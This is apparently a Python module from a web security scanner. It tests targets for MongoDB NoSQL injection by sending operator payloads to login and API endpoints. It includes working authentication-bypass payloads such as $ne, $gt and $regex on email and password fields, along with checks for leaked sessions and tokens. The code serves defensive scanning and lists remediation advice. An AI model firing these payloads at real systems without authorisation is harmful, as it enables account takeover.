"""
NoSQL injection testing.

Probes for MongoDB operator injection, JavaScript injection in NoSQL
queries, and authentication bypass via operator abuse. Detection is
based on response differences (bypass succeeds, errors leak engine info).

Depth levels:
  quick    — Operator injection on login/query params
  standard — + JS injection, auth bypass probes
  full     — + blind boolean extraction, regex DoS probes
"""
import json
import re
import ssl
import time
import urllib.request
import urllib.error
from typing import Optional
from urllib.parse import urlparse, urlencode, quote

from . import payloads


def _request(url, method="GET", data=None, headers=None, timeout=10):
    ctx = ssl.create_default_context()
    if data and isinstance(data, dict):
        payload = json.dumps(data).encode()
        content_type = "application/json"
    elif data and isinstance(data, str):
        payload = data.encode()
        content_type = "application/json"
    else:
        payload = None
        content_type = None

    req = urllib.request.Request(url, data=payload, method=method)
    req.add_header("User-Agent", "Regen/1.2 (Axolotl Labs Security Scanner)")
    if content_type:
        req.add_header("Content-Type", content_type)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)


def _finding(title, severity, description, location, **kwargs):
    return {
        "title": title,
        "severity": severity,
        "description": description,
        "location": location,
        "scanner": "nosql",
        **kwargs,
    }


NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoDB",
    r"CastError",
    r"BSONTypeError",
    r"\.find\(\)|\.findOne\(\)",
    r"Cannot read propert",
    r"E11000 duplicate key",
    r"\$where|BSON",
    r"DocumentNotFoundError",
]


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_nosql_operator_injection(target: str) -> list[dict]:
    """
    Send MongoDB operator payloads ($gt, $ne, $regex) in POST bodies
    to auth and query endpoints. If the server passes them through to
    the database, the query logic changes.
    """
    findings = []
    base = target.rstrip("/")

    test_endpoints = [
        f"{base}/api/auth/start",
        f"{base}/api/me",
        f"{base}/api/users",
    ]

    for url in test_endpoints:
        for operator_payload, label in payloads.NOSQL_PAYLOADS:
            test_data = {"email": operator_payload}
            status, _, body = _request(
                url, method="POST", data=test_data,
                headers={"Origin": base},
            )
            if status in (0, 404, 405):
                continue

            for pattern in NOSQL_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    findings.append(_finding(
                        f"NoSQL injection: {label} triggers error",
                        "high",
                        f"Sending a MongoDB operator in the email field "
                        f"triggered a database error. The server may be "
                        f"passing user input directly into a NoSQL query.",
                        url,
                        evidence=f"Pattern: {pattern}, payload: {label}",
                        cwe="CWE-943",
                    ))
                    break

            # Check if operator bypass succeeded (got data without auth)
            if status == 200:
                try:
                    resp = json.loads(body)
                    if isinstance(resp, dict) and resp.get("user"):
                        findings.append(_finding(
                            f"NoSQL auth bypass: {label}",
                            "critical",
                            f"Sending a MongoDB operator returned user data "
                            f"without valid credentials. The query was modified "
                            f"by the injected operator.",
                            url,
                            evidence=f"Status: 200, keys: {list(resp.keys())[:5]}",
                            cwe="CWE-943",
                        ))
                except (json.JSONDecodeError, ValueError):
                    pass

    if not findings:
        findings.append(_finding(
            "NoSQL operator injection: no errors or bypasses",
            "info",
            f"Tested {len(payloads.NOSQL_PAYLOADS)} MongoDB operator payloads "
            f"on auth/query endpoints; none triggered errors or returned data.",
            target,
        ))
    return findings


def test_nosql_string_injection(target: str) -> list[dict]:
    """
    Test string-based NoSQL injection in URL parameters and form fields.
    These target applications that build query strings rather than using
    parameterized queries.
    """
    findings = []
    base = target.rstrip("/")

    for payload, label in payloads.NOSQL_STRING_PAYLOADS:
        for param in ["q", "search", "query", "id", "name", "email"]:
            url = f"{base}/?{param}={quote(payload)}"
            status, _, body = _request(url)
            if status == 0:
                continue

            for pattern in NOSQL_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    findings.append(_finding(
                        f"NoSQL string injection via ?{param} ({label})",
                        "high",
                        f"NoSQL/MongoDB error triggered by {label} "
                        f"in the {param} parameter.",
                        url,
                        evidence=f"Pattern: {pattern}, param: {param}",
                        cwe="CWE-943",
                    ))
                    break

    if not findings:
        findings.append(_finding(
            "NoSQL string injection: no errors in URL params",
            "info",
            f"Tested {len(payloads.NOSQL_STRING_PAYLOADS)} NoSQL string payloads "
            f"across URL parameters; none triggered errors.",
            target,
        ))
    return findings


def test_nosql_auth_bypass(target: str) -> list[dict]:
    """
    Specifically target login/auth endpoints with operator-based bypasses.
    MongoDB's $ne operator in a password field matches all non-empty
    passwords, bypassing authentication.
    """
    findings = []
    base = target.rstrip("/")

    auth_endpoints = [
        f"{base}/api/auth/start",
        f"{base}/api/login",
        f"{base}/api/auth/login",
    ]

    bypass_payloads = [
        ({"email": {"$ne": ""}, "password": {"$ne": ""}}, "both fields $ne"),
        ({"email": {"$gt": ""}, "password": {"$gt": ""}}, "both fields $gt"),
        ({"email": {"$regex": ".*"}, "password": {"$ne": ""}}, "email regex + password $ne"),
        ({"email": "admin", "password": {"$ne": ""}}, "admin + password $ne"),
        ({"email": {"$in": ["admin", "root", "test"]}, "password": {"$ne": ""}}, "email $in + password $ne"),
    ]

    for url in auth_endpoints:
        for data, label in bypass_payloads:
            status, hdrs, body = _request(
                url, method="POST", data=data,
                headers={"Origin": base},
            )
            if status in (0, 404, 405):
                continue

            # Check for successful auth (session cookie set, 200 with token/user)
            has_session = False
            for k, v in hdrs.items():
                if k.lower() == "set-cookie" and ("session" in v.lower() or "token" in v.lower()):
                    has_session = True
                    break

            if status == 200 and has_session:
                findings.append(_finding(
                    f"NoSQL auth bypass: session set via {label}",
                    "critical",
                    f"POST {url} with operator injection set a session cookie. "
                    f"Authentication was bypassed using MongoDB operators.",
                    url,
                    evidence=f"Status: 200, session cookie set, payload: {label}",
                    remediation="Validate input types before querying. "
                                "Reject objects where strings are expected.",
                    cwe="CWE-943",
                ))

            try:
                resp = json.loads(body)
                if status == 200 and resp.get("token"):
                    findings.append(_finding(
                        f"NoSQL auth bypass: token returned via {label}",
                        "critical",
                        f"POST {url} with operator injection returned an auth token.",
                        url,
                        evidence=f"Status: 200, has token, payload: {label}",
                        remediation="Validate input types before querying.",
                        cwe="CWE-943",
                    ))
            except (json.JSONDecodeError, ValueError):
                pass

    if not findings:
        findings.append(_finding(
            "NoSQL auth bypass: no bypass achieved",
            "info",
            "Tested operator injection on auth endpoints; "
            "none returned sessions or tokens.",
            target,
        ))
    return findings


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

QUICK_TESTS = [
    ("NoSQL operator injection", test_nosql_operator_injection),
]

STANDARD_TESTS = QUICK_TESTS + [
    ("NoSQL string injection", test_nosql_string_injection),
    ("NoSQL auth bypass", test_nosql_auth_bypass),
]

FULL_TESTS = STANDARD_TESTS

DEPTH_MAP = {
    "quick": QUICK_TESTS,
    "standard": STANDARD_TESTS,
    "full": FULL_TESTS,
}


def run_nosql_tests(target: str, depth: str = "standard") -> list[dict]:
    import sys
    findings = []
    tests = DEPTH_MAP.get(depth, STANDARD_TESTS)

    for name, fn in tests:
        print(f"[regen] NoSQL: {name}...", file=sys.stderr)
        try:
            findings.extend(fn(target))
        except Exception as e:
            print(f"[regen] NoSQL '{name}' failed: {e}", file=sys.stderr)
            findings.append(_finding(
                f"NoSQL test failed: {name}", "info",
                f"Test could not complete: {e}", target,
            ))

    return findings
